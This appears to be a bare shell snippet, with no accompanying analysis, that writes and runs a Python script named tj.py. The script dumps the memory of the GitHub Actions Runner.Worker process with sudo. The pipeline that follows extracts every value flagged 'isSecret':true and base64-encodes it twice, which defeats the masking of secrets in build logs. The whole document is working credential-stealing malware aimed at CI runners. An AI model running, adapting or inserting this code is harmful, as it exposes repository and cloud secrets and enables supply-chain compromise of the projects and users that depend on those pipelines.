# Create tj.py inline
cat << 'PYTHON_SCRIPT' > tj.py
#!/usr/bin/env python3
import os
import re
import sys

def get_pid():
    # https://stackoverflow.com/questions/2703640/process-list-on-linux-via-python
    pids = [pid for pid in os.listdir('/proc') if pid.isdigit()]
    for pid in pids:
        try:
            with open(os.path.join('/proc', pid, 'cmdline'), 'rb') as cmdline_f:
                if b'Runner.Worker' in cmdline_f.read():
                    return pid
        except (IOError, PermissionError):
            continue
    raise Exception('Can not get pid of Runner.Worker')

if __name__ == "__main__":
    try:
        pid = get_pid()
        print(f"Found Runner.Worker process with PID: {pid}")
        map_path = f"/proc/{pid}/maps"
        mem_path = f"/proc/{pid}/mem"
        
        try:
            with open(map_path, 'r') as map_f, open(mem_path, 'rb', 0) as mem_f:
                print(f"Successfully opened memory maps file")
                for line in map_f.readlines():  # for each mapped region
                    m = re.match(r'([0-9A-Fa-f]+)-([0-9A-Fa-f]+) ([-r])', line)
                    if m and m.group(3) == 'r':  # readable region
                        start = int(m.group(1), 16)
                        end = int(m.group(2), 16)
                        # hotfix: OverflowError: Python int too large to convert to C long
                        # 18446744073699065856
                        if start > sys.maxsize:
                            continue
                        mem_f.seek(start)  # seek to region start
                    
                        try:
                            chunk = mem_f.read(end - start)  # read region contents
                            sys.stdout.buffer.write(chunk)
                        except OSError:
                            continue
        except PermissionError as e:
            print(f"Error: Permission denied. This script needs to be run with root privileges.")
            print(f"Error: {e}")
            print("Try running with: sudo python3 tj.py")
            sys.exit(1)
        except Exception as e:
            print(f"Error accessing process memory: {e}")
            sys.exit(1)
    except Exception as e:
        print(f"Error: {e}")
        sys.exit(1)
PYTHON_SCRIPT

# Execute the script
sudo python3 tj.py | tr -d '\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' | sort -u | base64 -w 0 | base64 -w 0